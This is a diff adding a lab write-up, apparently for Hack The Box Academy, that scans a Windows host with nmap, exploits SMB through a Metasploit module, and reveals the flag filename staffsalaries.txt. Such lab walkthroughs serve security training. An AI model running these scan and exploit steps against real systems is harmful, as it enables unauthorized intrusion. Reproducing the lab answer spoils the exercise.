@@ -534,3 +534,58 @@ Create a **interactive shell** in metepreter with `shell`
 
 
 ### Q: Exploit the target using what you've learned in this section, then submit the name of the file located in htb-student's Documents folder. (Format: filename.extension)
+
+```shell-session
+nmap -sC -sV -Pn 10.129.201.160
+```
+
+Output:
+
+![image](https://user-images.githubusercontent.com/83395536/224510196-a09922c0-71df-4566-bc9d-cfda938f09e7.png)
+
+Here we can see that we have a vulnerable Windows machine with SMB running. Lets exploit it with an SMB module from Metasploit.
+
+```shell-session
+sudo msfconsole
+```
+
+```shellsession
+search smb
+```
+
+```shell-session
+use 58
+```
+
+
+
+Now set up the options
+
+```shell-session
+options
+```
+
+![image](https://user-images.githubusercontent.com/83395536/224510211-30546bce-cfc1-4259-9e47-908eb9856ecd.png)
+
+And run the exploit
+
+```shell-session
+exploit
+```
+
+![image](https://user-images.githubusercontent.com/83395536/224510223-cec44c45-5fa1-47fd-9655-4a94d2fdb3d7.png)
+
+
+
+Now we need to find the name of the file that is in the Documents folder for the user we have logged in as. To do this we need to know how to move around in folders in Windows.
+
+
+
+Use `dir` to print out the files in the Documents folder to find the name of the file that is the flag
+
+![image](https://user-images.githubusercontent.com/83395536/224510180-f91967ca-661c-46fd-b47f-4d8dc57e1f05.png)
+
+
+
+And here our flag is the file `staffsalaries.txt`.
+
